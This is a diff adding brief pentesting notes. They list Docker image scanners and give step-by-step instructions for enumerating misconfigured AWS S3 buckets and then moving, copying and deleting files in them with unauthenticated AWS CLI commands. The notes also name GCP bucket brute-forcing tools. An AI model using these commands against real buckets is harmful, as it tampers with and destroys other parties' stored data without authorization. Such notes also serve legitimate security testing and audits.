@@ -1,0 +1,26 @@
+***Docker****
+Trivy, Clair, Dadga
+=========================
+**********AWS & S3 Bucket**********
+step 1. S3Scanner,lazys3,bucketfinder,s3-buckets-bruteforcer - S3 bucket scan - to find urls of aws s3 bucket
+step2. install aws-cli(aws cmd interface) to check version & create account.
+step3. extract access keys
+signin console.aws.amazon.com/iam/
+select users->add user
+fill details & create user
+download csv file & extract acccess keys
+step 4. configure aws-cli
+goto terminal run aws configure
+step5. identify vulnerable s3 buckets
+run cmd
+aws s3 ls s3://{buckey name}
+step6. exploit s3 bucket
+run cmd to manipulate files stored in s3
+aws s3 mv filename s3://{bucket name}/test-file.txt --no-sign-request
+aws s3 cp filename s3://{bucket name}/test-file.svg --no-sign-request
+aws s3 rm s3://{bucket name}/test-file.svg --no-sign-request
+=========================
+AWS pwn -- AWS hack tool
+=======================================
+****Google cloud****
+GCPBucketBrute -- google storage
